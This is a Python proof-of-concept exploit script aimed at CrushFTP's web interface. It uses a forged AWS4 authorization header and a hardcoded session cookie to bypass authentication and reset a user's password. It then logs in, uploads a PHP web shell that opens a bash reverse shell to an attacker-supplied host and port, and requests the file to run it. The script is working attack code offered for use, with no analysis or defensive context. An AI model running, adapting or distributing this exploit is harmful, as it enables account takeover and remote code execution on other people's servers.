#!/usr/bin/env python3

import requests
import sys
import random
import string

if len(sys.argv) < 6:
    print("[*] python3 poc.py <target> <username> <password> <lhost> <lport>")
    sys.exit()

proxies = {'http':'http://127.0.0.1:8080/'}

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
lhost = sys.argv[4]
lport = sys.argv[5]

def file_name(length):
    c = string.ascii_letters + string.digits
    name = ''.join(random.choice(c) for i in range(length))
    return name + '.php'


def resetpasswd():
    headers = {
        'Authorization': 'AWS4-HMAC-SHA256 Credential=crushadmin/',
        'Cookie': 'CrushAuth=1743113839553_vD96EZ70ONL6xAd1DAJhXMZYMn1111'
    }

    data = {
        'command': 'setUserItem',
        'data_action': 'update',
        'xmlItem': 'user',
        'serverGroup': 'MainUsers',
        'username': f'{username}',
        'user': f'<user type="properties"><password>{password}</password></user>',
        'c2f': '1111'
    }

    r = requests.post(url + '/WebInterface/function/', headers=headers, data=data, proxies=proxies)
    if r.status_code == 200:
        print("[*] Password successfully updated")
    else:
        print("[-] Failed with status code: ", r.status_code)


def login():
    s = requests.Session()
    r1 = s.get(url + '/WebInterface/function/', proxies=proxies)
    data = {
        'command':'login',
        'username':f'{username}',
        'password':f'{password}',
        'encoded':'true',
        'language':'en',
        'random':'0.08023259688354118'
    }
    r2 = s.post(url + '/WebInterface/function/', data=data, proxies=proxies)
    if r2.status_code == 200:
        print("[*] successfully Logged in")
    else:
        print("[-] Login failed with status code: ", r2.status_code)

    return s


def upload():
    name = file_name(4)
    payload = f'<?php system("bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\'"); ?>'
    length = len(payload)
    try:
        with open(name, "w") as f:
            f.write(payload)
    except FileExistsError:
        print("[-] File already exists")
    except Exception as e:
        print("[-] An error has occured: ", e)

    s = login()
    cookies = s.cookies
    cookie_dict = cookies.get_dict()
    payload1 = {
        'command':(None, 'openFile'),
        'c2f':(None,cookie_dict["currentAuth"]),
        'upload_path':(None, f'/webProd/{name}'),
        'upload_size':(None, length),
        'upload_id':(None, 'mf9ppkcmvp3sys9lhc'),
        'start_resume_loc':(None, '0'),
        'random':(None, '0.7280378758459468')

    }
    print("[*] Uploading Shell")
    r = s.post(url + '/WebInterface/function/', files=payload1, proxies=proxies)
    with open(name, "rb") as g:
        files = {'CFCD': (name, g, 'application/octet-stream')}
        r2 = requests.post(url + f'/U/mf9ppkcmvp3sys9lhc~1~{length}', files=files, cookies=cookies, proxies=proxies)
    if r2.status_code == 200:
        print("[*] Shell uploaded successfully")
    else:
        print("[-] Upload failed with status code: ", r2.status_code)
    return name

def shell():
    name = upload() 
    if url.startswith('http://'):
        url1 = url.replace('http://', "")
        url2 = 'http://' + url1.lstrip('ftp.')
    
    print("[*] Executing Shell")
    r = requests.get(url2 + '/' + name)
    


resetpasswd()
shell()
